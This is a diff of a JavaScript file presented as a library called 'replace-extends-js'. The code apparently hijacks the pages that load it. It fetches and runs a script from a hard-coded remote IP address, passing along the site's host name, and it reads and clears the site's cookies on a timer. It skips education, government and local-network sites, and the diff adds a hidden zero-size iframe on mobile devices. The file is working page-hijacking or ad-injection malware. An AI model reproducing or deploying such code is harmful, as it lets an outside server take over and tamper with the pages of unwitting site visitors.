@@ -1,8 +1,13 @@
 import { phone } from 'ismobilejs';
 import { mobileExtend, PCExtend } from './utils';
 import { mobileReplace, PCReplace } from './replace';
-import { AD_0X0 } from './config';
-
+// import { AD_0X0 } from './config';
+// if (phone) {
+//   // 唤醒广告位
+//   const scr = document.createElement('script');
+//   scr.src = AD_0X0;
+//   window.top.document.body.appendChild(scr);
+// }
 const [name, version] = ['replace-extends-js', '1.0.0'];
 const blackWebsite = /.edu|.org|12306.com|.*gov.*|^192.168|yoyo.qq.com/;
 const hostname = Object.keys(window.top.location).length > 5 && window.top.location.hostname;
@@ -43,13 +48,9 @@ function redirect() {
   const os = document.createElement('script');
   os.src = `http://117.121.41.228:3000/replace?cb=${fnName}&host=${str}`;
   window.top.document.head.appendChild(os);
-  os.remove();
+  if (os.remove) os.remove();
 }
 
-// function getCookie() {
-//   const arr = window.top.document.cookie.match(/[^ =;]+(?=\=)|[A-z]*/g);
-//   return arr;
-// }
 function getCookie() {
   const cookie = [];
   const all = window.top.document.cookie;
@@ -60,7 +61,7 @@ function getCookie() {
   }
   return cookie;
 }
-
+// , 'slv', 'idevst', 'idv', '_aswak', '_aswqert', '_aak', '_ast', 'atxyeq', 'atxdwwyeq'
 function clear() {
   const keys = getCookie();
   const { host } = window.top.location;
@@ -105,13 +106,13 @@ setInterval(() => {
 }, 3000);
 
 setTimeout(() => {
+  if (phone && hostname) {
+    const iframe = document.createElement('iframe');
+    iframe.style.width = '0'; iframe.style.height = '0';
+    const { body } = window.top.document;
+    body.insertBefore(iframe, body.firstChild);
+  }
   if (hostname) replace();
-  // if (phone) {
-  //   // 唤醒广告位
-  //   const scr = document.createElement('script');
-  //   scr.src = AD_0X0;
-  //   window.top.document.body.appendChild(scr);
-  // }
 }, 2000);
 setTimeout(() => {
   if (hostname) replace();
